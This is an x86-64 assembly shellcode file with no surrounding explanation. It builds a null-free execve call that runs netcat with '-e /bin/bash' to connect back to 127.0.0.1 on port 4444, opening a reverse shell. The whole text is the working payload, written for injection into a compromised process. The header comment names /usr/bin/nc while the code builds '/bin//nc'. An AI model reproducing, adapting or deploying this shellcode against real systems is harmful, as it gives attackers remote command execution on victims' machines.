;Shellcode execve(/usr/bin/nc, [/usr/bin/nc -e /bin/bash 127.0.0.1 4444], NULL)

[SECTION .text]

global _start

_start:

    ; clear RAX for NULL bytes to push

    xor rax, rax            ; clear RAX

    mov rbx, '/bin//nc'     ; prepare /bin/nc

    ; prepare first argument of execve in RDI

    push rax                ; NULL byte
    push rbx                ; /bin/nc
    mov rdi, rsp            ; ptr to /bin/nc

    ; prepare args for second argument of execve

    push rax                ; NULL byte
    push rdi                ; /bin/nc
    mov rbx, rsp            ; ptr to /bin/nc

    push rax                ; NULL byte
    push word '-e'          ; -e
    mov rcx, rsp            ; ptr to -e

    push rax                ; NULL byte
    mov rdx, '////bash'     ; /bin/bash
    push rdx                ;
    mov rdx, '/bin////'     ;
    push rdx                ;
    mov rdx, rsp            ; ptr to /bin/bash

    push rax                ; NULL byte
    mov r9, '127.0000'      ; 127.0.0.1
    mov r8, '.00000.1'      ;
    push r8                 ; 
    push r9                 ;
    mov r8, rsp             ; ptr to 127.0.0.1

    push rax                ; NULL byte
    push dword '4444'       ; 4444
    mov r9, rsp             ; ptr to 4444

    ; prepare second argument of execve in RSI

    push rax                ; NULL byte
    push r9 ;444            ; ptr to 4444
    push r8 ;ip             ; ptr to 127.0.0.1
    push rdx ;binbash       ; ptr to /bin/bash
    push rcx ;-e            ; ptr to -e
    push rbx ;nc            ; ptr to /bin/nc
    mov rsi, rsp            ; ptr to args

    ; prepare third argument of execve in RDX that is NULL

    xor rdx, rdx            ; clear RDX

    ; syscall execve

    mov al, 59              ; execve syscall
    syscall                 ; syscall
